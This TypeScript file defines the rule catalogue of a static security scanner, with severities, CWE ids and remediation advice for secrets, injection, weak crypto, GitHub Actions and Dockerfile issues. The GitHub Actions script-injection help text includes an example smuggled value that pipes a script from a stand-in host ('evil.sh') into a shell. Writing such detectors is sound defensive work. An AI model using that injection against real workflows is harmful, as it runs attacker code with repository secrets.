import type { Severity } from "../types.ts";

export interface RuleMeta {
  id: string;
  title: string;
  /**
   * Default severity. Injection detectors raise it when they can see where the
   * data comes from: request data in the same function → critical, a function
   * parameter → high. A merely dynamic string stays at the default.
   */
  severity: Severity;
  cwe: string[];
  help: string;
  languages: ("javascript" | "python" | "github-actions" | "dockerfile" | "any")[];
  /** Defaults to "security". Quality rules don't fail the build unless --fail-on-quality is set. */
  category?: "quality";
}

const RULE_LIST: RuleMeta[] = [
  {
    id: "secret/known-token",
    title: "Hardcoded credential",
    severity: "critical",
    cwe: ["CWE-798"],
    help: "Revoke the credential now (it is in git history), then load it from the environment or a secret manager.",
    languages: ["any"],
  },
  {
    id: "secret/private-key",
    title: "Private key committed to the repository",
    severity: "critical",
    cwe: ["CWE-321"],
    help: "Rotate the key pair and keep private keys out of source control (secret manager, CI secrets, KMS).",
    languages: ["any"],
  },
  {
    id: "secret/hardcoded-password",
    title: "Hardcoded password or secret",
    severity: "medium",
    cwe: ["CWE-798"],
    help: "Read the value from configuration or a secret manager instead of the source code. If it was ever pushed, rotate it.",
    languages: ["any"],
  },
  {
    id: "secret/jwt",
    title: "JSON Web Token committed to the repository",
    severity: "high",
    cwe: ["CWE-798"],
    help: "A JWT is a bearer credential: anyone holding it acts as its subject until it expires. Revoke the session/key that signed it and load tokens at runtime.",
    languages: ["any"],
  },
  {
    id: "secret/auth-header",
    title: "Credentials in an Authorization header",
    severity: "high",
    cwe: ["CWE-798"],
    help: "Replace the token with a variable (e.g. $TOKEN) in scripts and docs, and rotate the credential if it was real.",
    languages: ["any"],
  },
  {
    id: "secret/env-file",
    title: ".env file with real values committed",
    severity: "high",
    cwe: ["CWE-538", "CWE-798"],
    help: "Remove the file from git (git rm --cached), add it to .gitignore, commit a .env.example with placeholders instead, and rotate every credential it contained.",
    languages: ["any"],
  },
  {
    id: "js/sql-injection",
    title: "SQL query built from dynamic strings",
    severity: "medium",
    cwe: ["CWE-89"],
    help: "Use parameterized queries (placeholders such as ? or $1 with a values array) or a tagged-template SQL helper instead of concatenation/interpolation.",
    languages: ["javascript"],
  },
  {
    id: "js/command-injection",
    title: "Shell command built from dynamic strings",
    severity: "medium",
    cwe: ["CWE-78"],
    help: "Use execFile/spawn with an argument array and without `shell: true`; never interpolate input into a shell string.",
    languages: ["javascript"],
  },
  {
    id: "js/code-injection",
    title: "Dynamic code evaluation",
    severity: "high",
    cwe: ["CWE-94", "CWE-95"],
    help: "Avoid eval/new Function/vm on non-constant strings. Parse data with JSON.parse or use a lookup table.",
    languages: ["javascript"],
  },
  {
    id: "js/path-traversal",
    title: "File system path controlled by request data",
    severity: "high",
    cwe: ["CWE-22"],
    help: "Resolve the path against a fixed base directory and reject it unless it still starts with that base (path.resolve + startsWith), or map ids to files server-side.",
    languages: ["javascript"],
  },
  {
    id: "js/ssrf",
    title: "Outbound request to a URL controlled by request data",
    severity: "high",
    cwe: ["CWE-918"],
    help: "Validate the destination against an allow-list of hosts and block private/link-local addresses before making the request.",
    languages: ["javascript"],
  },
  {
    id: "js/open-redirect",
    title: "Redirect to a URL controlled by request data",
    severity: "medium",
    cwe: ["CWE-601"],
    help: "Redirect only to relative paths or to an allow-list of known hosts.",
    languages: ["javascript"],
  },
  {
    id: "js/xss",
    title: "HTML sink with dynamic content",
    severity: "medium",
    cwe: ["CWE-79"],
    help: "Use textContent or framework escaping. If HTML is required, sanitize it (e.g. DOMPurify) right before rendering.",
    languages: ["javascript"],
  },
  {
    id: "js/insecure-deserialization",
    title: "Unsafe deserialization",
    severity: "critical",
    cwe: ["CWE-502"],
    help: "node-serialize executes functions embedded in the payload. Use JSON.parse and validate the result with a schema.",
    languages: ["javascript"],
  },
  {
    id: "js/weak-hash",
    title: "Weak hash algorithm (MD5/SHA-1)",
    severity: "low",
    cwe: ["CWE-328"],
    help: "Use SHA-256 or better for integrity, and a password hash (argon2, scrypt, bcrypt) for passwords. Ignore this finding if the hash is not used for security.",
    languages: ["javascript"],
  },
  {
    id: "js/weak-cipher",
    title: "Broken or weak cipher",
    severity: "high",
    cwe: ["CWE-327"],
    help: "Use AES-256-GCM or ChaCha20-Poly1305 with a random IV. DES, 3DES, RC4, Blowfish and ECB mode are not safe.",
    languages: ["javascript"],
  },
  {
    id: "js/insecure-random",
    title: "Math.random() used for a security value",
    severity: "medium",
    cwe: ["CWE-338"],
    help: "Use crypto.randomBytes, crypto.randomUUID or crypto.getRandomValues for tokens, ids, passwords and nonces.",
    languages: ["javascript"],
  },
  {
    id: "js/tls-verification-disabled",
    title: "TLS certificate verification disabled",
    severity: "high",
    cwe: ["CWE-295"],
    help: "Keep certificate verification on. For private CAs, pass the CA bundle (`ca` option / NODE_EXTRA_CA_CERTS) instead.",
    languages: ["javascript"],
  },
  {
    id: "js/jwt-none-algorithm",
    title: "JWT accepts the 'none' algorithm",
    severity: "high",
    cwe: ["CWE-347"],
    help: "Pin the expected algorithms explicitly (e.g. algorithms: ['RS256']) and never allow 'none'.",
    languages: ["javascript"],
  },
  {
    id: "py/sql-injection",
    title: "SQL query built with string formatting",
    severity: "medium",
    cwe: ["CWE-89"],
    help: "Pass parameters separately: cursor.execute(\"... WHERE id = %s\", (user_id,)) or SQLAlchemy bound parameters.",
    languages: ["python"],
  },
  {
    id: "py/command-injection",
    title: "Shell command built from dynamic strings",
    severity: "medium",
    cwe: ["CWE-78"],
    help: "Use subprocess.run([...]) with a list of arguments and shell=False; avoid os.system/os.popen.",
    languages: ["python"],
  },
  {
    id: "py/code-injection",
    title: "Dynamic code evaluation",
    severity: "high",
    cwe: ["CWE-94", "CWE-95"],
    help: "Avoid eval/exec on non-constant strings. Use ast.literal_eval for literals or json.loads for data.",
    languages: ["python"],
  },
  {
    id: "py/insecure-deserialization",
    title: "Unsafe deserialization",
    severity: "high",
    cwe: ["CWE-502"],
    help: "pickle/marshal/shelve/yaml.load can execute code. Use json, or yaml.safe_load, for untrusted data.",
    languages: ["python"],
  },
  {
    id: "py/path-traversal",
    title: "File system path controlled by request data",
    severity: "high",
    cwe: ["CWE-22"],
    help: "Use werkzeug.utils.safe_join / send_from_directory, or resolve the path and check it stays inside the base directory.",
    languages: ["python"],
  },
  {
    id: "py/ssrf",
    title: "Outbound request to a URL controlled by request data",
    severity: "high",
    cwe: ["CWE-918"],
    help: "Validate the destination host against an allow-list and block private/link-local addresses.",
    languages: ["python"],
  },
  {
    id: "py/weak-hash",
    title: "Weak hash algorithm (MD5/SHA-1)",
    severity: "low",
    cwe: ["CWE-328"],
    help: "Use hashlib.sha256 or better; for non-security uses pass usedforsecurity=False to make the intent explicit.",
    languages: ["python"],
  },
  {
    id: "py/weak-cipher",
    title: "Broken or weak cipher",
    severity: "high",
    cwe: ["CWE-327"],
    help: "Use AES-GCM (cryptography's AESGCM) or ChaCha20-Poly1305. DES, 3DES, RC4, Blowfish and ECB mode are not safe.",
    languages: ["python"],
  },
  {
    id: "py/tls-verification-disabled",
    title: "TLS certificate verification disabled",
    severity: "high",
    cwe: ["CWE-295"],
    help: "Remove verify=False / unverified SSL contexts. For private CAs, pass verify='/path/to/ca.pem'.",
    languages: ["python"],
  },
  {
    id: "py/debug-enabled",
    title: "Debug mode enabled",
    severity: "medium",
    cwe: ["CWE-489"],
    help: "The Flask/Werkzeug debugger allows remote code execution. Drive debug from an environment variable that is off in production.",
    languages: ["python"],
  },
  {
    id: "py/insecure-random",
    title: "random module used for a security value",
    severity: "medium",
    cwe: ["CWE-338"],
    help: "Use the secrets module (secrets.token_hex, secrets.token_urlsafe, secrets.choice) for tokens and passwords.",
    languages: ["python"],
  },
  {
    id: "py/insecure-tempfile",
    title: "Race-prone temporary file (mktemp)",
    severity: "low",
    cwe: ["CWE-377"],
    help: "Use tempfile.mkstemp() or tempfile.NamedTemporaryFile().",
    languages: ["python"],
  },
  {
    id: "js/sensitive-log",
    title: "Sensitive data written to logs",
    severity: "medium",
    cwe: ["CWE-532"],
    help: "Log identifiers, not credentials or personal data. Drop the field, or mask it (last 4 digits) before logging; never log whole request bodies or headers.",
    languages: ["javascript"],
  },
  {
    id: "py/sensitive-log",
    title: "Sensitive data written to logs",
    severity: "medium",
    cwe: ["CWE-532"],
    help: "Log identifiers, not credentials or personal data. Drop the field or mask it before logging.",
    languages: ["python"],
  },
  {
    id: "js/http-no-timeout",
    title: "Outbound HTTP call without a timeout",
    severity: "medium",
    cwe: ["CWE-400"],
    help: "A slow partner keeps the request (and its socket) open indefinitely and piles up concurrent requests. Pass `timeout` (axios) or `signal: AbortSignal.timeout(ms)` (fetch), or set it once on the axios instance.",
    languages: ["javascript"],
    category: "quality",
  },
  {
    id: "js/unbounded-query",
    title: "Query without a filter or a limit",
    severity: "medium",
    cwe: ["CWE-770"],
    help: "Reading a whole table grows with the data until it exhausts memory or blocks the event loop while serializing. Add `where`, and `take`/`limit` with pagination.",
    languages: ["javascript"],
    category: "quality",
  },
  {
    id: "js/await-in-loop",
    title: "Database/HTTP call awaited inside a loop (N+1)",
    severity: "low",
    cwe: ["CWE-1050"],
    help: "Each iteration waits for a round trip. Batch it (WHERE id IN (...), createMany, a bulk endpoint) or run with bounded concurrency (p-limit).",
    languages: ["javascript"],
    category: "quality",
  },
  {
    id: "js/floating-promise",
    title: "Promise neither awaited nor handled",
    severity: "low",
    cwe: ["CWE-754"],
    help: "A rejection here is unhandled: errors are lost or crash the process. `await` it, return it, or add `.catch(...)`; `forEach` never waits for async callbacks — use for...of or Promise.all(map(...)).",
    languages: ["javascript"],
    category: "quality",
  },
  {
    id: "js/empty-catch",
    title: "Error silently swallowed",
    severity: "low",
    cwe: ["CWE-1069"],
    help: "Log the error with context, rethrow it, or leave a comment explaining why ignoring it is safe.",
    languages: ["javascript"],
    category: "quality",
  },
  {
    id: "js/sync-io-in-handler",
    title: "Blocking call inside a request handler",
    severity: "low",
    cwe: ["CWE-1050"],
    help: "Sync file system, crypto and child_process calls block the event loop for every concurrent request. Use the async/promise versions.",
    languages: ["javascript"],
    category: "quality",
  },
  {
    id: "py/http-no-timeout",
    title: "Outbound HTTP call without a timeout",
    severity: "medium",
    cwe: ["CWE-400"],
    help: "requests has no default timeout: a slow server hangs the worker forever. Pass timeout=(connect, read).",
    languages: ["python"],
    category: "quality",
  },
  {
    id: "py/empty-except",
    title: "Error silently swallowed",
    severity: "low",
    cwe: ["CWE-1069"],
    help: "Catch the specific exception you expect and log it, or explain in a comment why ignoring it is safe.",
    languages: ["python"],
    category: "quality",
  },
  {
    id: "js/cors-any-origin",
    title: "CORS allows any origin",
    severity: "medium",
    cwe: ["CWE-942"],
    help: "List the origins that may call the API (origin: [\"https://app.example.com\"]). Reflecting any origin together with credentials: true lets any website make authenticated requests as the user.",
    languages: ["javascript"],
  },
  {
    id: "js/gcm-no-tag-length",
    title: "AEAD decryption without a fixed tag length",
    severity: "medium",
    cwe: ["CWE-354"],
    help: "Pass { authTagLength: 16 } to createDecipheriv: without it Node accepts truncated authentication tags, which makes forging ciphertexts much easier.",
    languages: ["javascript"],
  },
  {
    id: "gha/script-injection",
    title: "Untrusted input interpolated into a workflow script",
    severity: "medium",
    cwe: ["CWE-78", "CWE-94"],
    help: "${{ }} is pasted into the script before it runs, so a PR title or branch name like `\"; curl evil.sh | sh #` becomes code. Pass the value through env: (VAR: ${{ github.event.pull_request.title }}) and use \"$VAR\" in the script.",
    languages: ["github-actions"],
  },
  {
    id: "gha/untrusted-checkout",
    title: "pull_request_target checks out the PR's code",
    severity: "critical",
    cwe: ["CWE-829"],
    help: "pull_request_target runs with secrets and a write token; checking out the fork's head and running its build gives that code your secrets. Use pull_request, or split into an unprivileged build and a privileged workflow_run.",
    languages: ["github-actions"],
  },
  {
    id: "gha/unpinned-action",
    title: "Third-party action not pinned to a commit",
    severity: "medium",
    cwe: ["CWE-829"],
    help: "Tags can be moved by the action's owner (or whoever compromises it). Pin to the full commit SHA and keep the tag as a comment: uses: owner/action@<40-char sha> # v2.1.0. Dependabot can keep pins updated.",
    languages: ["github-actions"],
  },
  {
    id: "gha/excessive-permissions",
    title: "Workflow token with write-all permissions",
    severity: "medium",
    cwe: ["CWE-250"],
    help: "Grant only what the job needs, e.g. permissions: { contents: read, pull-requests: write }.",
    languages: ["github-actions"],
  },
  {
    id: "docker/root-user",
    title: "Container runs as root",
    severity: "medium",
    cwe: ["CWE-250"],
    help: "Add a USER instruction with an unprivileged user in the final stage (or use a nonroot/distroless base image) so a compromised process doesn't get root in the container.",
    languages: ["dockerfile"],
  },
  {
    id: "docker/curl-pipe-shell",
    title: "Remote script piped into a shell during the build",
    severity: "medium",
    cwe: ["CWE-494"],
    help: "Download the script, verify its checksum or signature, then run it; or install from a package manager.",
    languages: ["dockerfile"],
  },
  {
    id: "docker/add-remote",
    title: "ADD downloads a remote file without a checksum",
    severity: "medium",
    cwe: ["CWE-494"],
    help: "Use ADD --checksum=sha256:... or download with curl and verify the hash before using the file.",
    languages: ["dockerfile"],
  },
  {
    id: "docker/latest-tag",
    title: "Base image without a pinned version",
    severity: "low",
    cwe: ["CWE-1357"],
    help: "Pin a version (node:22.11-slim) or a digest (@sha256:...) so builds are reproducible and an upstream change can't slip into production unnoticed.",
    languages: ["dockerfile"],
    category: "quality",
  },
];

export const RULES: ReadonlyMap<string, RuleMeta> = new Map(RULE_LIST.map((r) => [r.id, r]));

export function rule(id: string): RuleMeta {
  const r = RULES.get(id);
  if (!r) throw new Error(`unknown rule ${id}`);
  return r;
}

/** What a detector reports; the engine fills in rule metadata. */
export interface RawFinding {
  ruleId: string;
  line: number;
  column?: number;
  endLine?: number;
  /** Overrides the rule's default severity. */
  severity?: Severity;
  /** Extra context appended to the rule title. */
  detail?: string;
  /** Secret value to redact from the snippet shown in reports. */
  secret?: string;
}
